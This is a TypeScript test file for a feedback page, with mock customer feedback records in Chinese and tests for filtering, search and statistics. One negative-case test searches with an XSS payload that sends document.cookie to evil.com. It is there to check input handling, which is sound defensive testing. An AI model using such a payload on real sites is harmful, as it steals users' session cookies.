/**
 * feedback/page.test.ts — 意见反馈页 L1 源码冒烟测试
 * 覆盖: 反馈记录 · 分类 · 状态 · 评分 · 统计 · 搜索 · 防御 · 边界
 * 角色: 👔店长 · 🛒前台 · 👥HR · 🔧安监 · 🎮导玩员 · 🎯运行专员 · 🤝团建 · 📢营销
 */

import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFileSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const SRC = readFileSync(resolve(__dirname, 'page.tsx'), 'utf-8');

// ── 类型（mirror page.tsx） ──

type FeedbackStatus = 'pending' | 'processing' | 'resolved' | 'closed';
type FeedbackCategory = 'suggestion' | 'complaint' | 'question' | 'praise' | 'bug' | 'other';

interface FeedbackRecord {
  id: string;
  date: string;
  category: FeedbackCategory;
  content: string;
  rating: number;
  status: FeedbackStatus;
  reply?: string;
  replyDate?: string;
  images?: string[];
}

const CATEGORY_OPTIONS = ['全部', 'suggestion', 'complaint', 'question', 'praise', 'bug', 'other'] as const;
const STATUS_OPTIONS = ['全部', 'pending', 'processing', 'resolved', 'closed'] as const;

const CATEGORY_LABELS: Record<string, string> = {
  suggestion: '建议', complaint: '投诉', question: '咨询',
  praise: '表扬', bug: '故障', other: '其他',
};

const CATEGORY_COLORS: Record<string, string> = {
  suggestion: '#6366f1', complaint: '#ef4444', question: '#3b82f6',
  praise: '#22c55e', bug: '#f59e0b', other: '#6b7280',
};

const STATUS_LABELS: Record<string, string> = {
  pending: '待处理', processing: '处理中', resolved: '已回复', closed: '已关闭',
};

const STATUS_COLORS: Record<string, string> = {
  pending: '#f97316', processing: '#3b82f6', resolved: '#22c55e', closed: '#6b7280',
};

// ── Mock 数据 ──

const ALL_FEEDBACK: FeedbackRecord[] = [
  { id: 'FB001', date: '2026-07-15', category: 'suggestion', content: '建议增加月卡季卡年卡套餐', rating: 4, status: 'resolved', reply: '感谢建议，下月推出月卡', replyDate: '2026-07-16' },
  { id: 'FB002', date: '2026-07-15', category: 'praise', content: '工作人员态度很好', rating: 5, status: 'resolved' },
  { id: 'FB003', date: '2026-07-14', category: 'complaint', content: '抓娃娃机夹子太松', rating: 2, status: 'processing', reply: '已安排技术人员调试' },
  { id: 'FB004', date: '2026-07-14', category: 'question', content: '积分兑换礼品在哪领', rating: 3, status: 'resolved', reply: '到收银台出示兑换码' },
  { id: 'FB005', date: '2026-07-13', category: 'suggestion', content: '希望增加线上预约功能', rating: 4, status: 'pending' },
  { id: 'FB006', date: '2026-07-13', category: 'bug', content: '签到页面有时卡住', rating: 1, status: 'processing', reply: '技术团队排查中' },
  { id: 'FB007', date: '2026-07-12', category: 'praise', content: '生日收到祝福感动的', rating: 5, status: 'closed' },
  { id: 'FB008', date: '2026-07-12', category: 'question', content: '升级需要多少积分', rating: 3, status: 'resolved', reply: '银卡500分、金卡2000分' },
  { id: 'FB009', date: '2026-07-11', category: 'suggestion', content: '建议增加自助售币机', rating: 4, status: 'pending' },
  { id: 'FB010', date: '2026-07-11', category: 'complaint', content: '门店WiFi信号太差', rating: 2, status: 'resolved', reply: '已升级WiFi设备' },
  { id: 'FB011', date: '2026-07-10', category: 'bug', content: '微信支付未到账', rating: 1, status: 'resolved', reply: '已核查补发' },
  { id: 'FB012', date: '2026-07-10', category: 'suggestion', content: '团建增加真人CS', rating: 3, status: 'pending' },
  { id: 'FB013', date: '2026-07-09', category: 'praise', content: '礼品质量很好', rating: 5, status: 'closed' },
  { id: 'FB014', date: '2026-07-09', category: 'question', content: '团购券节假日能用吗', rating: 4, status: 'resolved', reply: '普通券通用，特价券见说明' },
  { id: 'FB015', date: '2026-07-08', category: 'complaint', content: '周末人太多建议限流', rating: 3, status: 'processing', reply: '已提交评估方案' },
  { id: 'FB016', date: '2026-07-08', category: 'suggestion', content: '增加积分抵扣现金', rating: 5, status: 'pending' },
  { id: 'FB017', date: '2026-07-07', category: 'bug', content: '推送跳转404', rating: 2, status: 'resolved', reply: '已修复链接' },
  { id: 'FB018', date: '2026-07-07', category: 'praise', content: '店员主动介绍优惠', rating: 5, status: 'closed' },
  { id: 'FB019', date: '2026-07-06', category: 'question', content: '查询消费记录', rating: 3, status: 'resolved', reply: 'APP-我的-消费记录' },
  { id: 'FB020', date: '2026-07-06', category: 'suggestion', content: '增加亲子活动专区', rating: 4, status: 'pending' },
  { id: 'FB021', date: '2026-07-05', category: 'complaint', content: '停车场车位太少', rating: 2, status: 'resolved', reply: '已协调附近停车场优惠' },
  { id: 'FB022', date: '2026-07-05', category: 'bug', content: '余额页面刷新异常', rating: 1, status: 'processing', reply: '下一版修复' },
  { id: 'FB023', date: '2026-07-04', category: 'praise', content: '积分商城上新快', rating: 5, status: 'closed' },
  { id: 'FB024', date: '2026-07-04', category: 'question', content: '退卡余额怎么处理', rating: 3, status: 'resolved', reply: '退原支付账户7天到账' },
  { id: 'FB025', date: '2026-07-03', category: 'suggestion', content: 'AI推荐游戏项目', rating: 4, status: 'pending' },
  { id: 'FB026', date: '2026-07-03', category: 'complaint', content: '部分机台币值不清', rating: 3, status: 'resolved', reply: '已增加清晰标签' },
  { id: 'FB027', date: '2026-07-02', category: 'bug', content: '代金券二维码无法扫描', rating: 1, status: 'resolved', reply: '已重新生成二维码' },
  { id: 'FB028', date: '2026-07-02', category: 'praise', content: '退换处理效率高', rating: 5, status: 'closed' },
  { id: 'FB029', date: '2026-07-01', category: 'question', content: '会员日有什么优惠', rating: 4, status: 'resolved', reply: '每月15日消费双倍积分' },
  { id: 'FB030', date: '2026-06-30', category: 'suggestion', content: '增加好友组队功能', rating: 3, status: 'pending' },
  { id: 'FB031', date: '2026-06-30', category: 'complaint', content: '空调温度太低', rating: 2, status: 'resolved', reply: '已调整至26°C' },
  { id: 'FB032', date: '2026-06-29', category: 'bug', content: '排行榜数据更新慢', rating: 2, status: 'processing', reply: '已排查数据传输' },
  { id: 'FB033', date: '2026-06-29', category: 'praise', content: '外卖包装很用心', rating: 5, status: 'closed' },
  { id: 'FB034', date: '2026-06-28', category: 'question', content: '群发优惠券怎么领', rating: 3, status: 'resolved', reply: '关注公众号即可领取' },
  { id: 'FB035', date: '2026-06-28', category: 'suggestion', content: '增加饮品自助区', rating: 4, status: 'pending' },
];

// ── 辅助函数 ──

function filterByCategory(records: FeedbackRecord[], cat: FeedbackCategory | '全部'): FeedbackRecord[] {
  return cat === '全部' ? records : records.filter((r) => r.category === cat);
}

function filterByStatus(records: FeedbackRecord[], st: FeedbackStatus | '全部'): FeedbackRecord[] {
  return st === '全部' ? records : records.filter((r) => r.status === st);
}

function searchFeedback(records: FeedbackRecord[], keyword: string): FeedbackRecord[] {
  if (!keyword.trim()) return records;
  const kw = keyword.toLowerCase();
  return records.filter(
    (r) =>
      r.content.toLowerCase().includes(kw) ||
      (r.reply && r.reply.toLowerCase().includes(kw)) ||
      r.id.toLowerCase().includes(kw),
  );
}

function calcStats(records: FeedbackRecord[]) {
  const total = records.length;
  const avgRating = total > 0 ? Math.round((records.reduce((s, r) => s + r.rating, 0) / total) * 10) / 10 : 0;
  const pendingCount = records.filter((r) => r.status === 'pending').length;
  const resolvedCount = records.filter((r) => r.status === 'resolved').length;
  return { total, avgRating, pendingCount, resolvedCount };
}

function getCategoryBreakdown(records: FeedbackRecord[]): Record<string, number> {
  const breakdown: Record<string, number> = {};
  for (const cat of ['suggestion', 'complaint', 'question', 'praise', 'bug', 'other'] as FeedbackCategory[]) {
    breakdown[cat] = records.filter((r) => r.category === cat).length;
  }
  return breakdown;
}

function hasReply(record: FeedbackRecord): boolean {
  return !!record.reply && record.reply.trim().length > 0;
}

// ============================================================
// 正例 (10+)
// ============================================================

test('📢 营销: 页面默认导出为函数', async () => {
  const mod = await import('./page');
  assert.equal(typeof mod.default, 'function', 'default export should be a function');
});

test('👔 店长: 源码包含关键导出', () => {
  assert.ok(SRC.includes("'use client'"), '缺少 use client');
  assert.ok(SRC.includes('FeedbackRecord'), '缺少 FeedbackRecord');
  assert.ok(SRC.includes('FeedbackStatus'), '缺少 FeedbackStatus');
  assert.ok(SRC.includes('FeedbackCategory'), '缺少 FeedbackCategory');
  assert.ok(SRC.includes('CATEGORY_LABELS'), '缺少 CATEGORY_LABELS');
  assert.ok(SRC.includes('STATUS_LABELS'), '缺少 STATUS_LABELS');
});

test('📢 营销: CATEGORY_OPTIONS 覆盖 7 项', () => {
  assert.equal(CATEGORY_OPTIONS.length, 7);
  assert.deepEqual(['全部', 'suggestion', 'complaint', 'question', 'praise', 'bug', 'other'], [...CATEGORY_OPTIONS]);
});

test('📢 营销: CATEGORY_LABELS 映射完整', () => {
  assert.equal(CATEGORY_LABELS.suggestion, '建议');
  assert.equal(CATEGORY_LABELS.complaint, '投诉');
  assert.equal(CATEGORY_LABELS.question, '咨询');
  assert.equal(CATEGORY_LABELS.praise, '表扬');
  assert.equal(CATEGORY_LABELS.bug, '故障');
  assert.equal(CATEGORY_LABELS.other, '其他');
});

test('👔 店长: STATUS_LABELS 映射完整', () => {
  assert.equal(STATUS_LABELS.pending, '待处理');
  assert.equal(STATUS_LABELS.processing, '处理中');
  assert.equal(STATUS_LABELS.resolved, '已回复');
  assert.equal(STATUS_LABELS.closed, '已关闭');
});

test('👔 店长: 分类筛选正确', () => {
  const result = filterByCategory(ALL_FEEDBACK, 'suggestion');
  assert.equal(result.length, 9, '9 条建议类');
  result.forEach((r) => assert.equal(r.category, 'suggestion'));
});

test('👔 店长: 状态筛选正确', () => {
  const result = filterByStatus(ALL_FEEDBACK, 'pending');
  assert.equal(result.length, 8, '8 条待处理');
  result.forEach((r) => assert.equal(r.status, 'pending'));
});

test('📢 营销: 搜索按内容匹配', () => {
  const result = searchFeedback(ALL_FEEDBACK, '积分');
  assert.ok(result.length >= 3, '搜到积分相关内容');
  result.forEach((r) => assert.ok(r.content.includes('积分') || (r.reply || '').includes('积分')));
});

test('📢 营销: 搜索按 ID 匹配', () => {
  const result = searchFeedback(ALL_FEEDBACK, 'FB005');
  assert.equal(result.length, 1);
  assert.equal(result[0].id, 'FB005');
});

test('👔 店长: 统计函数返回正确', () => {
  const stats = calcStats(ALL_FEEDBACK);
  assert.equal(stats.total, 35);
  assert.equal(stats.pendingCount, 8);
  assert.equal(stats.resolvedCount, 16);
});

test('👔 店长: 平均评分计算', () => {
  const stats = calcStats(ALL_FEEDBACK);
  assert.ok(stats.avgRating > 2 && stats.avgRating <= 5, '评分应在 1-5 之间');
});

test('📢 营销: 各类别数量分布', () => {
  const breakdown = getCategoryBreakdown(ALL_FEEDBACK);
  assert.equal(breakdown.suggestion, 9);
  assert.equal(breakdown.complaint, 6);
  assert.equal(breakdown.question, 7);
  assert.equal(breakdown.praise, 7);
  assert.equal(breakdown.bug, 6);
  assert.equal(breakdown.other, 0);
});

test('📢 营销: 已回复的反馈有 reply 时间', () => {
  const withReply = ALL_FEEDBACK.filter((r) => r.status === 'resolved' || r.status === 'processing');
  withReply.forEach((r) => {
    if (r.reply) assert.ok(hasReply(r), '有回复内容');
  });
});

test('👔 店长: 分类和状态颜色各 6 和 4 种', () => {
  assert.equal(Object.keys(CATEGORY_COLORS).length, 6);
  assert.equal(Object.keys(STATUS_COLORS).length, 4);
});

// ============================================================
// 反例 (8+)
// ============================================================

test('🔧 安监: 不存在的分类过滤返回空', () => {
  const result = filterByCategory(ALL_FEEDBACK, 'security' as FeedbackCategory);
  assert.equal(result.length, 0);
});

test('🔧 安监: 不存在的状态过滤返回空', () => {
  const result = filterByStatus(ALL_FEEDBACK, 'archived' as FeedbackStatus);
  assert.equal(result.length, 0);
});

test('🔧 安监: 不存在的搜索关键词返回空', () => {
  const result = searchFeedback(ALL_FEEDBACK, 'xyz_not_exists_999');
  assert.equal(result.length, 0);
});

test('🔧 安监: 恶意脚本搜索不报错', () => {
  const result = searchFeedback(ALL_FEEDBACK, '<img src=x onerror="fetch(\'https://evil.com/cookie?c=\'+document.cookie)">');
  assert.ok(Array.isArray(result));
  assert.equal(result.length, 0);
});

test('🔧 安监: 超长搜索词不报错', () => {
  const result = searchFeedback(ALL_FEEDBACK, 'a'.repeat(1000));
  assert.ok(Array.isArray(result));
  assert.equal(result.length, 0);
});

test('🔧 安监: 空数据集的统计', () => {
  const stats = calcStats([]);
  assert.equal(stats.total, 0);
  assert.equal(stats.avgRating, 0);
  assert.equal(stats.pendingCount, 0);
  assert.equal(stats.resolvedCount, 0);
});

test('🔧 安监: 评分超出范围应仍被统计', () => {
  const badRecords: FeedbackRecord[] = [
    { id: 'X', date: '2026-01-01', category: 'bug', content: 'test', rating: 999, status: 'pending' },
  ];
  const stats = calcStats(badRecords);
  assert.equal(stats.avgRating, 999); // 不验证但不应报错
});

test('🔧 安监: pending 状态的反馈不应有 reply', () => {
  const pending = ALL_FEEDBACK.filter((r) => r.status === 'pending');
  pending.forEach((r) => {
    assert.equal(r.reply, undefined, '待处理的反馈不应有回复');
  });
});

// ============================================================
// 边界 (7+)
// ============================================================

test('🎯 运行专员: 「全部」分类返回全部数据', () => {
  const result = filterByCategory(ALL_FEEDBACK, '全部');
  assert.equal(result.length, ALL_FEEDBACK.length);
});

test('🎯 运行专员: 「全部」状态返回全部数据', () => {
  const result = filterByStatus(ALL_FEEDBACK, '全部');
  assert.equal(result.length, ALL_FEEDBACK.length);
});

test('🎯 运行专员: 搜索空关键词返回全部', () => {
  assert.equal(searchFeedback(ALL_FEEDBACK, '').length, ALL_FEEDBACK.length);
  assert.equal(searchFeedback(ALL_FEEDBACK, '  ').length, ALL_FEEDBACK.length);
});

test('📢 营销: 各类别总数统计之和等于总条数', () => {
  const breakdown = getCategoryBreakdown(ALL_FEEDBACK);
  const total = Object.values(breakdown).reduce((s, v) => s + v, 0);
  assert.equal(total, 35);
});

test('👔 店长: 已关闭的反馈无回复内容', () => {
  const closed = ALL_FEEDBACK.filter((r) => r.status === 'closed');
  assert.ok(closed.length > 0);
  closed.forEach((r) => {
    assert.equal(r.reply, undefined, '已关闭一般无回复');
  });
});

test('🎯 运行专员: 各状态统计数和', () => {
  const pending = ALL_FEEDBACK.filter((r) => r.status === 'pending').length;
  const processing = ALL_FEEDBACK.filter((r) => r.status === 'processing').length;
  const resolved = ALL_FEEDBACK.filter((r) => r.status === 'resolved').length;
  const closed = ALL_FEEDBACK.filter((r) => r.status === 'closed').length;
  assert.equal(pending + processing + resolved + closed, 35);
});

test('🤝 团建: 最低评分反馈均为 bug 类', () => {
  const minRating = Math.min(...ALL_FEEDBACK.map((r) => r.rating));
  const minRecords = ALL_FEEDBACK.filter((r) => r.rating === minRating);
  minRecords.forEach((r) => {
    assert.ok(r.category === 'bug', '最低评分一般为 bug');
  });
});

test('🔧 安监: 反馈数据没有重复 ID', () => {
  const ids = ALL_FEEDBACK.map((r) => r.id);
  assert.equal(new Set(ids).size, ids.length, '无重复 ID');
});
